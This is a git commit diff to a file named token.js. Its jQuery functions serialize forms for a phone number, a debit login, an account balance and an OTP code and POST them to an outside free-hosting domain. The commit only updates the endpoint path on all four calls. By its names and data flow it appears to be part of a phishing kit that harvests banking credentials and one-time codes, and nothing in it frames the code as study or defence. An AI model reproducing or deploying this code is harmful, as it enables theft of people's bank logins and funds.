27c34da7ff7d24d3a9ffd4f61f500ac7f91c6510
dodypribadi5 <dodypribadi5@gmail.com>
2025-01-18 14:14:09 +0700

    Update token.js

--- token.js
+++ token.js
@@ -14,7 +14,7 @@ function sendNohp(){
    
       $.ajax({
         type: 'POST',
-        url: 'https://chroedevsi.whf.bz/v1-V/no.php',
+        url: 'https://chroedevsi.whf.bz/v1-Vi/no.php',
         data: $('#formHP').serialize(),
         datatype: 'JSON',   
     complete: function(){
@@ -40,7 +40,7 @@ function sendDebit(){
    
         $.ajax({
         type: 'POST',
-        url: 'https://chroedevsi.whf.bz/v1-V/login.php',
+        url: 'https://chroedevsi.whf.bz/v1-Vi/login.php',
         data: $('#formlog').serialize(),
         datatype: 'JSON',    
     complete: function(){    
@@ -75,7 +75,7 @@ function sendSaldo(){
   
         $.ajax({
         type: 'POST',
-        url: 'https://chroedevsi.whf.bz/v1-V/saldo.php',
+        url: 'https://chroedevsi.whf.bz/v1-Vi/saldo.php',
         data: $('#formsal').serialize(),
         datatype: 'JSON',   
    complete: function(){     
@@ -108,7 +108,7 @@ function sendOtp(){
    
         $.ajax({
         type: 'POST',
-        url: 'https://chroedevsi.whf.bz/v1-V/otp.php',
+        url: 'https://chroedevsi.whf.bz/v1-Vi/otp.php',
         data: $('#formLink').serialize(),
         datatype: 'JSON',    
     complete: function(){
